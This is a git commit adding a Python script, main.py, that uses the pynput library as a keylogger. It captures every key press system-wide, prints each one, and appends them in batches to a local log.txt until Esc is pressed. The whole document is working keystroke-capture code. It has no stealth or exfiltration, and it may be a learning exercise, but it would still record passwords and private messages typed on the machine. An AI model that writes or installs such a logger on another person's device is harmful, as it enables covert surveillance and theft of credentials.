f2d50451e1d49cdf7dd9ea458ab3fa8470ce0944
Vinayak Yadav <76102295+Vinayakyadav27041@users.noreply.github.com>
2023-04-20 01:37:51 +0530

    initial

---
+++ main.py
@@ -0,0 +1,32 @@
+import pynput
+
+from pynput.keyboard import Key, Listener
+
+count=0
+keys=[]
+
+def on_press(key):
+    global keys,count
+    keys.append(key)
+    count += 1
+    print(key)
+    if count>=10:
+        count=0
+        write_file(keys)
+        keys=[]
+
+def write_file(keys):
+    with open("log.txt","a") as f:
+        for key in keys:
+            k=str(key).replace("'","")
+            if k==" ":
+                f.write('\n')
+            else:
+                f.write(k)
+
+def on_release(key):
+    if key==Key.esc:
+        return False
+
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
